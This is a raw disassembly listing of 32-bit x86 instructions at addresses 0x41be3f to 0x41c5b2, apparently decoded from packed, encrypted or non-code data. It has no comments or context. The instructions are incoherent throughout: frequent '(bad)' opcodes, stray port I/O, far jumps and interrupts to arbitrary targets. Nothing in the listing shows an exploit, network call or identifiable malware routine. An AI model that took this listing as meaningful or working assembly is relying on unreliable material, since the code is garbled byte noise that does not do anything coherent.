  41be3f:	pop    es
  41be40:	inc    DWORD PTR [edi+0x69616fec]
  41be46:	push   0x9cad73b9
  41be4b:	inc    eax
  41be4c:	pushf  
  41be4d:	mov    bh,0xf7
  41be4f:	and    DWORD PTR [ecx],ebp
  41be51:	daa    
  41be52:	div    eax
  41be54:	mov    ecx,0xe96a8958
  41be59:	je     0x41bdfd
  41be5b:	outs   dx,BYTE PTR ds:[esi]
  41be5c:	and    BYTE PTR [ebp+0x39],bl
  41be5f:	pop    edx
  41be60:	mov    dh,0xd1
  41be62:	out    dx,al
  41be63:	out    0x4f,al
  41be65:	xchg   ecx,eax
  41be66:	sub    eax,0xeb486c40
  41be6b:	xor    edi,eax
  41be6d:	or     ecx,DWORD PTR [eax+0x49]
  41be70:	or     ebp,ebp
  41be72:	pop    edx
  41be73:	push   edx
  41be74:	sbb    eax,0xf5a0e91f
  41be79:	inc    ecx
  41be7a:	push   esp
  41be7b:	xlat   BYTE PTR ds:[ebx]
  41be7c:	dec    edi
  41be7d:	pop    ss
  41be7e:	cmp    al,0xf4
  41be80:	xchg   esp,eax
  41be81:	xchg   edx,eax
  41be82:	int    0x47
  41be84:	inc    edi
  41be85:	mov    ds:0xd6b40110,eax
  41be8a:	rcl    DWORD PTR [ecx-0x8],1
  41be8d:	jae    0x41befe
  41be8f:	jne    0x41bed7
  41be91:	fild   QWORD PTR es:[ecx]
  41be94:	stc    
  41be95:	cwde   
  41be96:	pusha  
  41be97:	mov    al,ds:0xb03cdf52
  41be9c:	jl     0x41bedc
  41be9e:	out    0xe9,eax
  41bea0:	inc    ecx
  41bea1:	mov    eax,ds:0xc39bc9a2
  41bea6:	lods   al,BYTE PTR ds:[esi]
  41bea7:	mov    ch,0x50
  41bea9:	jo     0x41bead
  41beab:	es repz cmp eax,0x353b124d
  41beb2:	mov    dl,0x9c
  41beb5:	add    BYTE PTR [eax-0x49299804],0x44
  41bebc:	pop    ds
  41bebd:	adc    BYTE PTR ds:0x54fa5557,0x7a
  41bec4:	xchg   esp,eax
  41bec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bec6:	adc    BYTE PTR [eax-0x76],dh
  41bec9:	imul   edx,DWORD PTR [edi-0x22],0x51f28701
  41bed0:	push   ebx
  41bed1:	xor    esi,DWORD PTR [edx-0x5c]
  41bed4:	xchg   BYTE PTR [eax+0x5c0149e9],bh
  41beda:	mov    edi,cs
  41bedc:	sub    DWORD PTR [edx-0x49],edi
  41bedf:	push   cs
  41bee0:	mov    dl,0xc
  41bee2:	aad    0xa9
  41bee4:	ds mov eax,0x3feaec75
  41beea:	loop   0x41beeb
  41beec:	js     0x41bea2
  41beee:	rol    DWORD PTR [edx+0x5b7f6787],0x51
  41bef5:	cdq    
  41bef6:	sbb    ah,0xe4
  41bef9:	mov    edx,0xaa23281d
  41befe:	or     edi,DWORD PTR [edx-0x30]
  41bf01:	cld    
  41bf02:	xchg   edx,edx
  41bf04:	neg    DWORD PTR [edi-0x6ecd2283]
  41bf0a:	fbstp  TBYTE PTR [esi+0x31]
  41bf0d:	push   esp
  41bf0e:	cdq    
  41bf0f:	popa   
  41bf10:	inc    ebx
  41bf11:	xor    esi,eax
  41bf13:	xchg   BYTE PTR [ebx],al
  41bf15:	ja     0x41bee2
  41bf17:	mov    esi,0xa5e4a974
  41bf1c:	inc    ebp
  41bf1d:	std    
  41bf1e:	stos   DWORD PTR es:[edi],eax
  41bf1f:	mov    ecx,0x15669868
  41bf24:	or     al,0xb8
  41bf26:	and    BYTE PTR fs:[esi-0x1e],cl
  41bf2a:	stos   BYTE PTR es:[edi],al
  41bf2b:	inc    ecx
  41bf2c:	xchg   ecx,eax
  41bf2d:	popa   
  41bf2e:	sub    al,0xda
  41bf30:	ins    DWORD PTR es:[edi],dx
  41bf31:	nop
  41bf32:	jb     0x41bf0a
  41bf34:	adc    ecx,DWORD PTR [edx+0x38]
  41bf37:	js     0x41bf66
  41bf39:	(bad)  
  41bf3a:	pushf  
  41bf3b:	cmp    edx,ebp
  41bf3d:	jle    0x41bf67
  41bf3f:	or     eax,0xbe54b1df
  41bf44:	fst    QWORD PTR [ebx]
  41bf46:	mov    gs,WORD PTR [ebx+0x4a]
  41bf49:	push   esp
  41bf4a:	enter  0x36e5,0x93
  41bf4e:	cmp    DWORD PTR [ebx+edi*8-0x5b],edx
  41bf52:	push   ebx
  41bf53:	sahf   
  41bf54:	fstp   DWORD PTR [edx+0x323cdcf9]
  41bf5a:	sbb    edi,0x9
  41bf5d:	arpl   cx,di
  41bf5f:	jb     0x41bf52
  41bf61:	push   ecx
  41bf62:	pop    es
  41bf63:	xrelease xchg DWORD PTR [edx-0x2229097f],esi
  41bf6a:	sbb    ecx,DWORD PTR [eax]
  41bf6c:	outs   dx,DWORD PTR ds:[esi]
  41bf6d:	js     0x41bfbf
  41bf6f:	and    BYTE PTR [ebp-0x4d02c5f5],bl
  41bf75:	adc    eax,0x82911682
  41bf7a:	into   
  41bf7b:	sub    bh,BYTE PTR [ebp-0x7d]
  41bf7e:	push   esp
  41bf7f:	cs mov edx,0x64208708
  41bf85:	push   ebx
  41bf86:	jg     0x41bf7a
  41bf88:	sub    ch,BYTE PTR [edx+0x5a]
  41bf8b:	lods   eax,DWORD PTR ds:[esi]
  41bf8c:	and    eax,0x2affc5ed
  41bf91:	and    ecx,DWORD PTR [ebx-0x5a]
  41bf94:	mov    dl,0x2
  41bf96:	retf   
  41bf97:	add    eax,esp
  41bf99:	imul   esp,DWORD PTR [ebp-0x64f18ed6],0x124951ca
  41bfa3:	jl     0x41bfc3
  41bfa5:	add    al,0xb5
  41bfa7:	mov    ch,0x93
  41bfa9:	mov    al,0x99
  41bfab:	in     eax,0x22
  41bfad:	test   eax,0xfb19941c
  41bfb2:	pop    edx
  41bfb3:	add    eax,DWORD PTR [ecx+0xe]
  41bfb6:	cmp    al,bh
  41bfb8:	(bad)  
  41bfb9:	mov    esi,0xc96147a9
  41bfbe:	lods   al,BYTE PTR ds:[esi]
  41bfbf:	sub    al,0x2d
  41bfc1:	test   DWORD PTR [edx+0xf652d31],ecx
  41bfc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfc8:	mov    al,0xea
  41bfca:	xchg   BYTE PTR [ecx+0x5d9a1320],dh
  41bfd0:	dec    esp
  41bfd1:	into   
  41bfd2:	jmp    0x207e:0xd38b3a96
  41bfd9:	inc    ebx
  41bfda:	mov    ds:0x7ba95bc3,eax
  41bfdf:	mov    ah,0xbb
  41bfe1:	mov    edx,DWORD PTR [ecx+ecx*1]
  41bfe4:	push   0xffffffdf
  41bfe6:	popa   
  41bfe7:	pop    edx
  41bfe8:	fisttp WORD PTR ds:0xaf567f79
  41bfee:	jb     0x41bf7c
  41bff0:	(bad)  
  41bff1:	pusha  
  41bff2:	jle    0x41bfcb
  41bff4:	jmp    0x825f:0xfd049a07
  41bffb:	mov    WORD PTR [esi-0x371041e7],cs
  41c001:	and    al,0xb5
  41c003:	adc    edx,DWORD PTR [ebx-0x2f343b6]
  41c009:	cmp    eax,0xd5302db8
  41c00e:	cmp    DWORD PTR [eax-0x5dffe4d1],ecx
  41c014:	or     dh,BYTE PTR [ebp+edi*1+0x7]
  41c018:	iret   
  41c019:	jmp    0x1f0023d9
  41c01e:	and    al,0x21
  41c020:	mov    ch,0x81
  41c022:	cmp    ch,BYTE PTR [ecx+0x46]
  41c025:	mov    ebp,0x453f51e5
  41c02a:	push   esp
  41c02b:	push   ecx
  41c02c:	cmc    
  41c02d:	outs   dx,DWORD PTR ds:[esi]
  41c02e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c02f:	sub    al,0x27
  41c031:	and    al,0xdc
  41c033:	push   esp
  41c034:	lds    ecx,FWORD PTR [edx+0x45]
  41c037:	adc    DWORD PTR [ecx+0x2f],ebx
  41c03a:	cld    
  41c03b:	neg    ebx
  41c03d:	add    ah,BYTE PTR [eax-0x2fa2b3e8]
  41c043:	into   
  41c044:	call   0x22382146
  41c049:	pop    ss
  41c04a:	pop    edx
  41c04b:	inc    esi
  41c04c:	push   0xf8277e8b
  41c051:	cli    
  41c052:	add    DWORD PTR [ebx-0x7ff36403],edx
  41c058:	retf   0x8aa3
  41c05b:	call   0x5f55c987
  41c060:	jbe    0x41c07c
  41c062:	sub    BYTE PTR [edi],al
  41c064:	and    BYTE PTR [edi-0x5a],ch
  41c067:	or     ah,BYTE PTR [esi]
  41c069:	fadd   QWORD PTR [esi+ebp*4]
  41c06c:	jbe    0x41c052
  41c06e:	mov    al,ds:0xd9ec6dc0
  41c073:	fldcw  WORD PTR [edi+edi*1-0x67]
  41c077:	add    BYTE PTR [edx+0x5b],0x11
  41c07b:	call   0x1e8a:0xb3488cd
  41c082:	inc    eax
  41c083:	add    al,0x8
  41c085:	lock cli 
  41c087:	push   0xb12ec35a
  41c08c:	inc    esp
  41c08d:	mov    edx,0xa1710a2a
  41c092:	into   
  41c093:	pop    ebx
  41c094:	sbb    al,0x5f
  41c096:	js     0x41c09c
  41c098:	sub    al,0xe9
  41c09a:	pushf  
  41c09b:	(bad)  
  41c09c:	aam    0xbd
  41c09e:	mov    DWORD PTR [ecx],0xa4170bed
  41c0a4:	jmp    0x41c101
  41c0a6:	mov    ds:0x8db5637,eax
  41c0ab:	xchg   BYTE PTR [ebx],bh
  41c0ad:	loopne 0x41c050
  41c0af:	dec    ebx
  41c0b0:	cmc    
  41c0b1:	push   0x54c730cf
  41c0b6:	(bad)  
  41c0b7:	scas   eax,DWORD PTR es:[edi]
  41c0b8:	(bad)  
  41c0b9:	mov    esp,0x15b36e5e
  41c0be:	mov    ?,WORD PTR [eax]
  41c0c0:	dec    esp
  41c0c1:	mov    eax,0x93dae1ef
  41c0c6:	sub    eax,0xbbc3ad18
  41c0cb:	and    DWORD PTR [edi],ecx
  41c0cd:	aad    0x9c
  41c0cf:	ds call 0x18f71a27
  41c0d5:	out    dx,al
  41c0d6:	and    BYTE PTR [esp+eax*4-0x65],dh
  41c0da:	add    bl,bl
  41c0dc:	push   esp
  41c0dd:	mov    DWORD PTR [edx+0x6eea2a53],esi
  41c0e3:	mov    bh,BYTE PTR [edx]
  41c0e5:	pop    esp
  41c0e6:	ds inc edi
  41c0e8:	push   0xffffffcf
  41c0ea:	das    
  41c0eb:	(bad)  
  41c0ec:	push   edx
  41c0ed:	out    0x32,eax
  41c0ef:	adc    al,0xdc
  41c0f1:	mov    cl,BYTE PTR [ecx+0x4c4bda53]
  41c0f7:	cli    
  41c0f8:	shl    eax,0xa7
  41c0fb:	bswap  ebp
  41c0fd:	dec    ebx
  41c0fe:	push   edi
  41c0ff:	or     eax,0x272879ff
  41c104:	or     ebx,ebx
  41c106:	jmp    0x41c132
  41c108:	js     0x41c159
  41c10a:	lahf   
  41c10b:	fs pop ds
  41c10d:	mov    ebx,0x6b2cf35c
  41c112:	in     eax,0xfb
  41c114:	mov    eax,ds:0xb6d8f8ef
  41c119:	adc    BYTE PTR [ebx-0x4f],ah
  41c11c:	jae    0x41c0a0
  41c11e:	xor    DWORD PTR [esi],ebx
  41c120:	jle    0x41c164
  41c122:	mov    cl,0x73
  41c124:	add    BYTE PTR [ebp+eiz*8+0x7c7581e6],bl
  41c12b:	ret    0xb4ac
  41c12e:	pop    ebx
  41c12f:	or     BYTE PTR [eax+0x24],cl
  41c132:	xchg   ax,ax
  41c134:	call   0xf334:0xe34a8e5b
  41c13b:	inc    esi
  41c13c:	fs sbb dl,dh
  41c13f:	fst    DWORD PTR [ecx]
  41c141:	xchg   BYTE PTR [ebp+0x16],bh
  41c144:	lods   al,BYTE PTR ds:[esi]
  41c145:	leave  
  41c146:	add    ch,BYTE PTR [ecx+0x57]
  41c149:	clc    
  41c14a:	mov    bl,0x16
  41c14c:	sbb    BYTE PTR [ecx+ebp*4+0x40],0x1b
  41c151:	(bad)  
  41c152:	scas   eax,DWORD PTR es:[edi]
  41c153:	dec    ebx
  41c154:	ins    DWORD PTR es:[edi],dx
  41c155:	sahf   
  41c156:	xor    DWORD PTR [esi],ebx
  41c158:	enter  0x4fa9,0x3c
  41c15c:	sub    DWORD PTR [edi],ecx
  41c15e:	in     eax,0x72
  41c160:	mov    eax,ds:0x2cb8ae42
  41c165:	push   ebx
  41c166:	jl     0x41c1c9
  41c168:	sbb    cl,dh
  41c16a:	jl     0x41c0f0
  41c16c:	fcmovne st,st(0)
  41c16e:	frstor [ecx+0x6c]
  41c171:	ret    
  41c172:	sub    BYTE PTR [eax-0x1550dfd9],ah
  41c178:	xchg   BYTE PTR [eax-0x72385350],dh
  41c17e:	ins    DWORD PTR es:[edi],dx
  41c17f:	lods   eax,DWORD PTR ds:[esi]
  41c180:	test   al,0xdd
  41c182:	pusha  
  41c183:	into   
  41c184:	outs   dx,DWORD PTR ds:[esi]
  41c185:	add    dh,bh
  41c187:	jge    0x41c143
  41c189:	xor    al,0xc4
  41c18b:	ds popa 
  41c18d:	(bad)  
  41c18e:	jmp    0x6960b11e
  41c193:	stos   DWORD PTR es:[edi],eax
  41c194:	pushf  
  41c195:	add    BYTE PTR [ecx+0x7b7586d8],dl
  41c19b:	sub    al,0x3c
  41c19d:	into   
  41c19e:	arpl   WORD PTR [ebp+0x44],ax
  41c1a1:	mov    ecx,0xd2f1c545
  41c1a6:	jno    0x41c1b0
  41c1a8:	mov    ah,0xc2
  41c1aa:	jge    0x41c229
  41c1ac:	(bad)  
  41c1ad:	and    BYTE PTR [edi-0x104e65ef],bl
  41c1b3:	aam    0x9c
  41c1b5:	xor    ch,ch
  41c1b7:	dec    esp
  41c1b8:	(bad)  
  41c1b9:	mov    cl,bl
  41c1bb:	scas   al,BYTE PTR es:[edi]
  41c1bc:	sbb    ecx,esp
  41c1be:	imul   eax,DWORD PTR [ebx+eiz*4],0xffffffda
  41c1c2:	aas    
  41c1c3:	lea    eax,[ecx+0x513eaecc]
  41c1c9:	bound  eax,QWORD PTR [ecx+0x5bbe61cb]
  41c1cf:	imul   ecx,DWORD PTR [ecx-0x7a],0xffffffe2
  41c1d3:	loop   0x41c159
  41c1d5:	out    dx,eax
  41c1d6:	dec    eax
  41c1d7:	push   ecx
  41c1d8:	xor    eax,edx
  41c1da:	push   0xdb4ccd9a
  41c1df:	pop    ebx
  41c1e0:	clc    
  41c1e1:	inc    ecx
  41c1e2:	lahf   
  41c1e3:	scas   eax,DWORD PTR es:[di]
  41c1e5:	cwde   
  41c1e6:	pop    edx
  41c1e7:	or     BYTE PTR [edx+0x2883fc05],bl
  41c1ed:	mov    cl,al
  41c1ef:	or     cl,BYTE PTR [edx-0x51]
  41c1f2:	loopne 0x41c26f
  41c1f4:	imul   ebp,DWORD PTR ds:0xfe421dad,0xa3da93eb
  41c1fe:	aaa    
  41c1ff:	lock lds eax,FWORD PTR [ecx+eax*4]
  41c203:	in     eax,dx
  41c204:	dec    ebp
  41c205:	cmp    ecx,edi
  41c207:	inc    esp
  41c208:	jl     0x41c231
  41c20a:	jnp    0x41c1e9
  41c20c:	fwait
  41c20d:	mov    ecx,0xdf1175af
  41c212:	addr16 enter 0x363b,0x62
  41c217:	add    ch,BYTE PTR [edi+0x2e3e742a]
  41c21d:	rcr    dh,0x6b
  41c220:	and    eax,DWORD PTR [ecx-0x35e563e9]
  41c226:	ja     0x41c1b8
  41c228:	xor    DWORD PTR [esi+0x24],ebx
  41c22b:	mov    ch,0x26
  41c22d:	shl    DWORD PTR [ebp-0x75],cl
  41c230:	leave  
  41c231:	loop   0x41c1d7
  41c233:	xor    ah,BYTE PTR [ebx+eax*8]
  41c236:	jecxz  0x41c229
  41c238:	cmp    al,0xfa
  41c23a:	leave  
  41c23b:	scas   eax,DWORD PTR es:[edi]
  41c23c:	mov    esi,0x272fc24b
  41c241:	(bad)  
  41c242:	jg     0x41c28f
  41c244:	xchg   esi,eax
  41c245:	mov    WORD PTR [esi+0x19],ss
  41c248:	inc    edx
  41c249:	loope  0x41c22b
  41c24b:	in     eax,0xe
  41c24d:	pop    ss
  41c24e:	not    bl
  41c250:	leave  
  41c251:	(bad)  
  41c252:	sbb    dl,bl
  41c254:	and    eax,0xec3311b4
  41c259:	pop    ecx
  41c25a:	dec    ebx
  41c25b:	(bad)  
  41c25c:	mov    es,WORD PTR [ebp+0x74ca171f]
  41c262:	popa   
  41c263:	sbb    bl,BYTE PTR [ebx+edi*1-0x4743e359]
  41c26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c26b:	outs   dx,DWORD PTR ds:[esi]
  41c26c:	ds (bad) fs:[edi+edi*4+0x34]
  41c272:	mov    dl,0xea
  41c274:	jne    0x41c21b
  41c276:	mov    dh,0xf
  41c278:	inc    ebp
  41c279:	pop    es
  41c27a:	cmp    DWORD PTR [ecx],esp
  41c27c:	mov    ds:0xfdcf6808,eax
  41c281:	jmp    0x41c22d
  41c283:	in     al,0x3e
  41c285:	repnz cmp al,0xba
  41c288:	js     0x41c24b
  41c28a:	or     al,BYTE PTR [ecx-0x2e]
  41c28d:	sbb    al,0x40
  41c28f:	jns    0x41c26c
  41c291:	repz in eax,dx
  41c293:	pop    esp
  41c294:	(bad)  
  41c295:	sub    eax,DWORD PTR [ecx-0x6f]
  41c298:	rcr    ebx,cl
  41c29a:	mov    edx,es
  41c29c:	jg     0x41c2b0
  41c29e:	cmp    al,0xa2
  41c2a0:	fisttp QWORD PTR [edi-0x5ea84505]
  41c2a6:	jne    0x41c24f
  41c2a8:	loop   0x41c2d2
  41c2aa:	pop    ecx
  41c2ab:	dec    esp
  41c2ac:	icebp  
  41c2ad:	ret    0xde88
  41c2b0:	lods   eax,DWORD PTR ds:[esi]
  41c2b1:	mov    ch,0x5e
  41c2b3:	push   0xbf09e937
  41c2b8:	dec    esi
  41c2b9:	stc    
  41c2ba:	push   0x6e28a330
  41c2bf:	iret   
  41c2c0:	push   cs
  41c2c1:	std    
  41c2c2:	pop    ecx
  41c2c3:	inc    eax
  41c2c4:	inc    ecx
  41c2c5:	in     eax,dx
  41c2c6:	sti    
  41c2c7:	sar    DWORD PTR [eax+0x4509061f],1
  41c2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2ce:	fadd   DWORD PTR [ebp-0x19]
  41c2d1:	dec    esp
  41c2d2:	jmp    0x23e200b1
  41c2d7:	add    al,0xd7
  41c2d9:	rcl    DWORD PTR [edi-0x70854e06],0x71
  41c2e0:	and    BYTE PTR [edi+0x49],ch
  41c2e3:	icebp  
  41c2e4:	inc    edx
  41c2e5:	rol    DWORD PTR [ebx+ebx*8],1
  41c2e8:	inc    ecx
  41c2e9:	stos   DWORD PTR es:[edi],eax
  41c2ea:	hlt    
  41c2eb:	fcom   st(5)
  41c2ed:	mov    esp,0x867ffee
  41c2f2:	xor    DWORD PTR [edx-0x71],0x819edcee
  41c2f9:	and    al,0x41
  41c2fb:	add    BYTE PTR [bx+si+0x7f3e],bh
  41c300:	lock inc ebx
  41c302:	rcr    BYTE PTR [ecx-0x6e],0x51
  41c306:	xchg   al,bl
  41c308:	les    edi,FWORD PTR [eax+0x1c]
  41c30b:	xchg   edi,eax
  41c30c:	xchg   edx,eax
  41c30d:	push   ds
  41c30e:	mov    al,ds:0xf1c098c4
  41c313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c314:	sbb    DWORD PTR [ecx],esp
  41c316:	mov    al,bh
  41c318:	js     0x41c31c
  41c31a:	mov    ebp,DWORD PTR [edx-0x5b]
  41c31d:	fs int 0x22
  41c320:	push   ds
  41c321:	in     al,0x1b
  41c323:	ds imul esp,esp,0x9
  41c327:	lahf   
  41c328:	bnd jmp 0x41c2b9
  41c32b:	dec    ebp
  41c32c:	pavgw  mm6,mm5
  41c32f:	adc    cl,dh
  41c331:	jp     0x41c2cf
  41c333:	pushf  
  41c334:	cmp    al,0x4a
  41c336:	sub    ebx,ecx
  41c338:	out    dx,al
  41c339:	pop    ebp
  41c33a:	(bad)  
  41c33b:	push   ebx
  41c33c:	cmp    DWORD PTR [edx+0x41],0x47180f14
  41c343:	imul   esp,DWORD PTR [eax+0x192d21b4],0xffffffaa
  41c34a:	inc    ecx
  41c34b:	dec    ecx
  41c34c:	push   cs
  41c34d:	pop    eax
  41c34e:	outs   dx,DWORD PTR ds:[esi]
  41c34f:	or     DWORD PTR [ecx+edx*1-0x283ded5d],edi
  41c356:	push   eax
  41c357:	jo     0x41c3b8
  41c359:	shl    BYTE PTR [ecx+ebx*1+0x56],1
  41c35d:	cs (bad) 
  41c35f:	aad    0xbf
  41c361:	mov    ecx,0x42f4d81c
  41c366:	xchg   esp,eax
  41c367:	mov    al,ds:0x9866bbe7
  41c36c:	sbb    eax,DWORD PTR [edx+0x17]
  41c36f:	mov    dl,0xe9
  41c371:	mov    al,0x57
  41c373:	push   ecx
  41c374:	cmp    ch,BYTE PTR [eax+esi*8+0x23]
  41c378:	shl    BYTE PTR [ebx+0x54d7711f],0x39
  41c37f:	xor    al,0xd0
  41c381:	pop    ss
  41c382:	sub    al,0x61
  41c384:	daa    
  41c385:	or     DWORD PTR [ebp+0x40],edx
  41c388:	bnd jbe 0x41c33b
  41c38b:	cmp    eax,0xecd4085a
  41c390:	or     DWORD PTR [esi+0x32],ebx
  41c393:	fiadd  DWORD PTR [ebp+ebp*4+0x431bad37]
  41c39a:	test   eax,0x1b5f46c4
  41c39f:	dec    edx
  41c3a0:	out    dx,al
  41c3a1:	std    
  41c3a2:	cmp    eax,0x825ce925
  41c3a7:	push   ebx
  41c3a8:	and    eax,0xe3c8747
  41c3ad:	sbb    bh,BYTE PTR [ebx+eiz*2-0x2b]
  41c3b1:	sub    edi,ebp
  41c3b3:	fwait
  41c3b4:	mov    fs,WORD PTR [ebx-0x2b]
  41c3b7:	inc    ecx
  41c3b8:	push   esi
  41c3b9:	(bad)  
  41c3ba:	and    BYTE PTR [ebx-0x11],bh
  41c3bd:	xchg   DWORD PTR [ebp-0x48def4bc],esp
  41c3c3:	xchg   edi,eax
  41c3c4:	cmp    BYTE PTR [edi+0x76],bh
  41c3c7:	rol    DWORD PTR [edx],cl
  41c3c9:	fsub   st,st(7)
  41c3cb:	adc    cl,bl
  41c3cd:	ja     0x41c3e6
  41c3cf:	add    al,BYTE PTR [ecx-0x76]
  41c3d2:	sub    ah,0x54
  41c3d5:	lods   eax,DWORD PTR ds:[esi]
  41c3d6:	sub    BYTE PTR [edi-0x1f],al
  41c3d9:	add    edi,ebx
  41c3db:	popa   
  41c3dc:	test   al,0x2
  41c3de:	xlat   BYTE PTR ds:[ebx]
  41c3df:	rcl    DWORD PTR [ecx],1
  41c3e1:	sbb    ebp,DWORD PTR [edi+0x49]
  41c3e4:	int3   
  41c3e5:	aaa    
  41c3e6:	gs cmp eax,0x9838bff9
  41c3ec:	outs   dx,BYTE PTR ds:[esi]
  41c3ed:	cmp    DWORD PTR [ebp+eax*2-0x11],esi
  41c3f1:	push   eax
  41c3f2:	mov    dl,0x87
  41c3f4:	jo     0x41c42f
  41c3f6:	iret   
  41c3f7:	jg     0x41c460
  41c3f9:	pop    ss
  41c3fa:	cmp    esp,esi
  41c3fc:	mov    ah,0x70
  41c3fe:	arpl   WORD PTR [eax-0x40],sp
  41c401:	(bad)  
  41c403:	jae    0x41c419
  41c405:	pop    ds
  41c406:	inc    ebp
  41c407:	les    esp,FWORD PTR [ebx+0x6f10792]
  41c40d:	ins    BYTE PTR es:[edi],dx
  41c40e:	daa    
  41c40f:	cmp    ebx,DWORD PTR [ecx-0x11]
  41c412:	xor    DWORD PTR [eax],0x8538da04
  41c418:	xchg   edx,eax
  41c419:	mov    ds:0x3a1bdf00,eax
  41c41e:	sbb    DWORD PTR [ecx],esi
  41c420:	jae    0x41c441
  41c422:	mov    dh,BYTE PTR [edx-0x42e709f7]
  41c428:	scas   eax,DWORD PTR es:[edi]
  41c429:	sbb    DWORD PTR [ebp+eiz*2+0x16],esp
  41c42d:	(bad)  
  41c42e:	out    0x86,al
  41c430:	popf   
  41c431:	jg     0x41c3f1
  41c433:	popa   
  41c434:	xor    bl,al
  41c436:	bound  esi,QWORD PTR [ebp+0x4bda5b8a]
  41c43c:	sub    eax,0x517ce2a1
  41c441:	test   BYTE PTR [ebx-0x73],cl
  41c444:	sub    eax,0x7119b881
  41c449:	mov    cl,0x74
  41c44b:	lea    esp,[eax]
  41c44d:	xor    DWORD PTR [edx+0x3d239f31],ecx
  41c453:	sar    BYTE PTR [edx-0x52],0x8c
  41c457:	mov    ebp,0x4c2230ff
  41c45c:	imul   ecx,DWORD PTR [esi+edi*8],0x1b
  41c460:	cld    
  41c461:	and    BYTE PTR [esi-0x48],cl
  41c464:	jmp    0x8880:0x94324b5a
  41c46b:	xchg   ecx,eax
  41c46c:	jge    0x41c3ef
  41c46e:	mov    ds:0x2b82b3a5,eax
  41c473:	adc    ah,BYTE PTR [ecx]
  41c475:	rdtsc  
  41c477:	inc    ebx
  41c478:	adc    DWORD PTR [edi+0x583d94a6],0xffffffb3
  41c47f:	push   0x19
  41c481:	jmp    0x77d1:0x659df645
  41c488:	mov    bl,0x7c
  41c48a:	sbb    al,0x3d
  41c48c:	jne    0x41c418
  41c48e:	loope  0x41c444
  41c490:	inc    ecx
  41c491:	jne    0x41c47b
  41c493:	xor    ecx,edx
  41c495:	pop    edx
  41c496:	sbb    dh,BYTE PTR [ecx-0x26]
  41c499:	mov    esi,0x7348ab17
  41c49e:	loope  0x41c425
  41c4a0:	jns    0x41c446
  41c4a2:	sub    edi,DWORD PTR [edx-0x3a]
  41c4a5:	and    eax,0x4302cab2
  41c4aa:	add    BYTE PTR [edx+0x44],dh
  41c4ad:	rol    DWORD PTR [edx-0x765c5680],1
  41c4b3:	(bad)  
  41c4b5:	inc    ebx
  41c4b6:	scas   eax,DWORD PTR es:[edi]
  41c4b7:	lock and dh,BYTE PTR [edx]
  41c4ba:	dec    edx
  41c4bb:	mov    edi,0xb839683
  41c4c0:	daa    
  41c4c1:	sub    ch,BYTE PTR [ecx+0x7f]
  41c4c4:	xchg   esi,eax
  41c4c5:	push   esp
  41c4c6:	imul   ebp,esi,0x61
  41c4c9:	popf   
  41c4ca:	(bad)  
  41c4cb:	stos   DWORD PTR es:[edi],eax
  41c4cc:	pop    ecx
  41c4cd:	fdivp  st(3),st
  41c4cf:	jmp    0x41c4b0
  41c4d1:	sahf   
  41c4d2:	(bad)  
  41c4d3:	mov    ch,0x35
  41c4d5:	dec    BYTE PTR [edx+0x5]
  41c4d8:	fwait
  41c4d9:	inc    ecx
  41c4da:	cmp    BYTE PTR cs:[edi],cl
  41c4dd:	sti    
  41c4de:	and    DWORD PTR [ebp+esi*1+0x38],eax
  41c4e2:	jb     0x41c54e
  41c4e4:	(bad)  
  41c4e6:	nop
  41c4e7:	mov    al,0x95
  41c4e9:	nop
  41c4ea:	add    eax,0x4abe5161
  41c4ef:	sub    bh,BYTE PTR [edx]
  41c4f1:	std    
  41c4f2:	push   esp
  41c4f3:	xlat   BYTE PTR ds:[ebx]
  41c4f4:	test   ah,0x3
  41c4f7:	and    DWORD PTR [ebx-0xf3dc987],eax
  41c4fd:	sub    ebp,DWORD PTR [ecx-0x44c84a24]
  41c503:	xor    bh,BYTE PTR [esi-0xf]
  41c506:	int    0xb8
  41c508:	jg     0x41c4c7
  41c50a:	dec    edi
  41c50b:	sbb    al,0x3e
  41c50d:	push   0x2
  41c50f:	loope  0x41c562
  41c511:	mov    esp,0x3b604fe6
  41c516:	cmp    bl,BYTE PTR [eax]
  41c518:	and    al,BYTE PTR [edx+0x63120614]
  41c51e:	addr16 call 0x3023:0x7ac853
  41c526:	lods   eax,DWORD PTR ds:[esi]
  41c527:	mov    ebp,0xbb1563de
  41c52c:	jmp    0x31e3:0x2651a7bb
  41c533:	or     eax,0x55ceea6
  41c538:	dec    esp
  41c539:	lea    esi,[edx-0x248bb6d5]
  41c53f:	jecxz  0x41c556
  41c541:	inc    esp
  41c542:	sti    
  41c543:	xchg   ebp,eax
  41c544:	and    eax,0x71f8ef5f
  41c549:	jno    0x41c58e
  41c54b:	stc    
  41c54c:	jle    0x41c56e
  41c54e:	fadd   DWORD PTR [edx+0x72]
  41c551:	loopne 0x41c595
  41c553:	cmp    dl,BYTE PTR [ebx+ebx*4+0xe]
  41c557:	push   edx
  41c558:	inc    ecx
  41c559:	js     0x41c549
  41c55b:	adc    al,0x84
  41c55d:	or     DWORD PTR [ebx],edi
  41c55f:	jo     0x41c508
  41c561:	retf   
  41c562:	xor    BYTE PTR [ebp-0x20],0x10
  41c566:	(bad)  [ebp+0x199d4568]
  41c56c:	dec    ebp
  41c56d:	jno    0x41c54a
  41c56f:	mov    dl,ah
  41c571:	pusha  
  41c572:	jns    0x41c5be
  41c574:	dec    edx
  41c575:	cmp    BYTE PTR [ecx+eiz*4],dh
  41c578:	xchg   ebx,eax
  41c579:	addr16 dec edi
  41c57b:	pop    ebx
  41c57c:	test   ebp,0x531399c8
  41c582:	fs aad 0xc5
  41c585:	stos   DWORD PTR es:[edi],eax
  41c586:	enter  0x68aa,0x1
  41c58a:	or     al,BYTE PTR [ebx-0x277e2a2c]
  41c590:	jp     0x41c572
  41c592:	pushf  
  41c593:	or     bl,BYTE PTR [ecx+0x77]
  41c596:	test   DWORD PTR ds:0xab5fda3,ecx
  41c59c:	rol    bh,0x81
  41c59f:	outs   dx,DWORD PTR ds:[esi]
  41c5a0:	push   ecx
  41c5a1:	or     ecx,DWORD PTR es:[ebp-0x77]
  41c5a5:	add    esi,ecx
  41c5a7:	jmp    0x41c569
  41c5a9:	int3   
  41c5aa:	fist   WORD PTR ds:0xc052a2b2
  41c5b0:	stc    
  41c5b1:	das    
  41c5b2:	or     DWORD PTR [esi+0x65],edx
